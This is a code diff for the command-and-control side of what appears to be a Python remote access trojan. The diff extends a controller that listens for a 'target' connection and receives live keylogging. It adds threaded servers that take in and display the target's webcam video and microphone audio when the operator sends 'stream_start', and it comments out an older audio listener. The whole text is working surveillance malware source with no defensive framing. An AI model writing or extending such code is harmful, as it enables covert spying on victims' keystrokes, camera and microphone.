@@ -6,7 +6,16 @@ import pynput
 import re
 import pyaudio  # This library is used for audio input/output operations.
 from pynput.keyboard import Key, Listener  # This library is used for capturing keyboard events.
+import threading
+import cv2
+import pickle
+import struct
+import time
 
+
+CONTROL_PORT = 5555
+VIDEO_PORT = 9999
+AUDIO_PORT = 9998
 
 # Function to send data reliably as JSON-encoded strings
 def reliable_send(data):
@@ -120,16 +129,16 @@ def keylogging_live():
         print(keylog) if keylog != 'end of keylogging' else None
 
 
-def liveaudio_start():
-    global liveaudio_status, audio_filename
+# def liveaudio_start():
+#     global liveaudio_status, audio_filename
 
-    p = pyaudio.PyAudio()
-    stream = p.open(format=pyaudio.paInt16, channels=1, rate=44100, output=True)
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    sock.bind(('0.0.0.0', 7777))
+#     p = pyaudio.PyAudio()
+#     stream = p.open(format=pyaudio.paInt16, channels=1, rate=44100, output=True)
+#     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+#     sock.bind(('0.0.0.0', 7777))
 
-    print(f"[i] This audio live-streaming session will be recorded as {audio_filename} at the end of the session")
-    print("[+] Start listening to the target's microphone... (Press ESC to end the session)")
+#     print(f"[i] This audio live-streaming session will be recorded as {audio_filename} at the end of the session")
+#     print("[+] Start listening to the target's microphone... (Press ESC to end the session)")
 
     def check_stop_key(key):
         global liveaudio_status, audio_filename
@@ -161,6 +170,78 @@ def liveaudio_start():
     while liveaudio_status:
         data, _ = sock.recvfrom(1024 * 2)  # 2 bytes per sample (16-bit)
         stream.write(data)
+
+# --- Global Flag to Stop Threads ---
+stop_threads = False
+
+# --- Stream Reception Functions ---
+def video_reception_thread():
+    global stop_threads
+    video_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    video_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    video_server.bind(('0.0.0.0', VIDEO_PORT))
+    video_server.listen(1)
+    print("[*] Video server waiting for connection on port 9999...")
+    
+    try:
+        conn, addr = video_server.accept()
+        print(f"[+] Video client connected from: {addr}")
+        
+        data = b""
+        payload_size = struct.calcsize("L")
+
+        while not stop_threads:
+            while len(data) < payload_size:
+                packet = conn.recv(4096)
+                if not packet: raise ConnectionError("Client disconnected")
+                data += packet
+            
+            packed_msg_size = data[:payload_size]
+            data = data[payload_size:]
+            msg_size = struct.unpack("L", packed_msg_size)[0]
+
+            while len(data) < msg_size:
+                data += conn.recv(4096)
+            
+            frame_data = data[:msg_size]
+            data = data[msg_size:]
+            
+            frame = pickle.loads(frame_data)
+            cv2.imshow('Live Video Stream', frame)
+            if cv2.waitKey(1) & 0xFF == ord('q'):
+                print("[!] 'q' pressed in video window. Type 'quit' in shell to exit.")
+                # Don't stop threads here, let the main shell handle it
+    except Exception as e:
+        print(f"[!] Video stream ended: {e}")
+    finally:
+        print("[-] Video reception thread finished.")
+        cv2.destroyAllWindows()
+        video_server.close()
+
+def audio_reception_thread():
+    global stop_threads
+    audio_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    audio_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    audio_server.bind(('0.0.0.0', AUDIO_PORT))
+    audio_server.listen(1)
+    print("[*] Audio server waiting for connection on port 9998...")
+
+    try:
+        conn, addr = audio_server.accept()
+        print(f"[+] Audio client connected from: {addr}")
+
+        p = pyaudio.PyAudio()
+        stream = p.open(format=pyaudio.paInt16, channels=1, rate=44100, output=True)
+        
+        while not stop_threads:
+            data = conn.recv(1024)
+            if not data: break
+            stream.write(data)
+    except Exception as e:
+        print(f"[!] Audio stream ended: {e}")
+    finally:
+        print("[-] Audio reception thread finished.")
+        audio_server.close()
 
 # Function for the main communication loop with the target
 def target_communication():
@@ -218,6 +299,12 @@ def target_communication():
             else:
                 print('[!] Live keylogging is already running.')
 
+        elif command == 'stream_start':
+            v_thread = threading.Thread(target=video_reception_thread, daemon=True)
+            a_thread = threading.Thread(target=audio_reception_thread, daemon=True)
+            v_thread.start()
+            a_thread.start()
+
         else:
             # For other commands, receive and print the result from the target.
             result = reliable_recv()
@@ -237,7 +324,7 @@ keylogging_status = False
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 # Bind the socket to any incoming request address ('0.0.0.0') to the port (5555).
-sock.bind(('0.0.0.0', 5555))
+sock.bind(('0.0.0.0', CONTROL_PORT))
 
 # Start listening for incoming connections (maximum 5 concurrent connections).
 print('[+] Listening For The Incoming Connections')
